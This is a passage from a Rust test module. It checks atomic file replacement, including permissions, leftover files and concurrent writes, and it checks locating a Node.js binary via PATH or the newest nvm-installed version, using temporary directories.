            replace_file(&path, "{\"a\":1}").unwrap();
            assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o700);
        }
        // Nothing left beside it, and two writes at once each get a name.
        let leftovers = fs::read_dir(dir.join("nested")).unwrap().count();
        assert_eq!(leftovers, 1);
        std::thread::scope(|s| {
            for i in 0..8 {
                let path = &path;
                s.spawn(move || replace_file(path, &format!("{{\"n\":{i}}}")).unwrap());
            }
        });
        assert_eq!(fs::read_dir(dir.join("nested")).unwrap().count(), 1);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn finds_node_on_path_first_and_picks_the_newest_nvm() {
        let root = std::env::temp_dir().join(format!("to-hoot-node-{}", std::process::id()));
        let on_path = root.join("bin");
        fs::create_dir_all(&on_path).unwrap();
        fs::write(on_path.join(NODE), "").unwrap();
        let home = root.join("home");
        for v in ["v18.20.0", "v22.3.0", "v20.11.1", "not-a-version"] {
            fs::create_dir_all(home.join(".nvm/versions/node").join(v).join("bin")).unwrap();
        }
        assert_eq!(newest_nvm(&home.join(".nvm/versions/node")), Some(home.join(".nvm/versions/node/v22.3.0")));
        let path_var = std::env::join_paths([root.join("missing"), on_path.clone()]).unwrap();
        assert_eq!(find_node(Some(path_var), &home), Some(on_path.join(NODE)));
        let _ = fs::remove_dir_all(&root);
    }
}
